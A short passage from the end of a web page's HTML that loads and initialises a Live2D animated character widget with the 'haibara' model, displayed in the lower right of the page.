src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"haibara"},"display":{"position":"right","width":250,"height":300},"mobile":{"show":true},"react":{"opacity":0.8}});</script></body></html>
